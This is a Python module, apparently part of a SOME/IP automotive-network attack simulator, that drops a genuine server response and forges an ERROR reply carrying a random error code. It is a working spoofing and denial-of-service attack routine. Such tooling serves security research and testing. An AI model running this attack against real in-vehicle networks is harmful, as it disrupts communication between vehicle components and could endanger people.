""" Removes a valid response from a server and replaces this response with an Error message. """
import copy
import random

from src import Msg
from src import SomeIPPacket
from src.attacks import AttackerHelper

def fakeResponse(a, msgOrig):
    """ Attack Specific Function. """
    sender = msgOrig.receiver
    receiver = msgOrig.sender
    timestamp = None

    message = {}

    message['service'] = msgOrig.message['service']
    message['method'] = msgOrig.message['method']
    message['client'] = msgOrig.message['client']
    message['session'] = msgOrig.message['session']
    message['proto'] = SomeIPPacket.VERSION
    message['iface'] = SomeIPPacket.INTERFACE

    message['type'] = SomeIPPacket.messageTypes['ERROR']
    errors = ['E_UNKNOWN_SERVICE', 'E_UNKNOWN_METHOD', 'E_WRONG_PROTOCOL_VERSION', 'E_WRONG_INTERFACE_VERSION', 'E_WRONG_MESSAGE_TYPE']
    message['ret'] = SomeIPPacket.errorCodes[random.choice(errors)]


    msg = Msg.Msg(sender, receiver, message, timestamp)

    return msg


def doAttack(curAttack, msgOrig, a, attacksSuc):
    """ Generic Function called from Attacker module. """
    RetVal = {}

    if a.verbose:
        print ('Fake Response Attack')

    if msgOrig.message['type'] == SomeIPPacket.messageTypes['REQUEST']:
        msg = fakeResponse(a, msgOrig)
        if a.verbose:
            print ('MALICIOUS MSG: ', msg.message, ' FROM=', msg.sender, ' TO=', msg.receiver)
        RetVal['msg'] = msg
        RetVal['attackOngoing'] = False
        RetVal['dropMsg'] = True
        RetVal['counter'] = attacksSuc + 1

    else:
        RetVal['msg'] = None
        RetVal['attackOngoing'] = True
        RetVal['dropMsg'] = False
        RetVal['counter'] = attacksSuc
    

    return RetVal
    
